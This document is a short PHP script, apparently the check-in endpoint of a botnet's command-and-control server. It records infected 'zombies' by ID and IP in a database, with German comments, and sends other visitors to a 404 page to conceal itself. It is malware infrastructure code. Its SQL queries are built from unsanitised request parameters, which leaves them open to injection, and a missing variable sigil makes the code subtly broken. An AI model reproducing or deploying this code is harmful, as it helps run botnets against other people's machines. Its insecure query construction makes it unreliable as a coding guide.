<?php
include_once('config.php');

$zombieID = isset($_GET['id'])?$_GET['id']:'';
$zombieIP = isset($_GET['ip'])?$_GET['ip']:'';
if(!empty($zombieID)&&!empty(zombieIP)) {
	
	include_once('setup_db_conn.php');
	
	// Bot bereits registriert?
	$query = 'SELECT id FROM zombies WHERE id='.htmlentities($zombieID).';';
	$result = mysql_query($query);
	if(mysql_num_rows($result)>0) {
		// Bot bekannt
		$query = 'UPDATE zombies SET ip="'.htmlentities($zombieIP).'" WHERE id='.htmlentities($zombieID).';';
	} else {
		// neuer Bot
		$query = 'INSERT INTO zombies (id,ip) VALUES ('.htmlentities($zombieID).',"'.htmlentities($zombieIP).'");';
	}
	mysql_query($query);
	
	mysql_free_result($result);
	mysql_close($link);
	
	echo getenv("HTTP_X_FORWARDED_FOR")?getenv("HTTP_X_FORWARDED_FOR").'<br>':'';
	echo getenv("REMOTE_ADDR");
	
} else {
	header("Location: /404.html");
}
?>